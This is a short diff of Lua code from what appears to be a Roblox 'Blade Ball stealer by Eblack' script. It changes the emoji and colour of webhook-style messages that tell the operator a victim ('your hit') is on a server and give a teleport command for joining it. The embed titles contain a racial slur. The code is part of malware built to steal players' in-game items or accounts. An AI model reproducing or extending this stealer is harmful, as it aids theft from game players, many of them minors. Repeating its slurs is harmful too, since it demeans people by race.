@@ -206,8 +206,8 @@ local function SendJoinMessage(list, prefix)
     local data = {
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["embeds"] = {{
-            ["title"] = "🟣 Bro join your hit nigga 🎯",
-            ["color"] = 8323327,
+            ["title"] = "🔵 Bro join your hit nigga 🎯",
+            ["color"] = 255,
             ["fields"] = fields,
             ["footer"] = {
                 ["text"] = "Blade Ball stealer by Eblack"
@@ -287,8 +287,8 @@ local function SendMessage(list)
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "🟣 The nigga is on the server 🎉" ,
-            ["color"] = 8323327,
+            ["title"] = "🔵 The nigga is on the server 🎉" ,
+            ["color"] = 255,
 			["fields"] = fields,
 			["footer"] = {
 				["text"] = "Blade Ball stealer by Eblack"
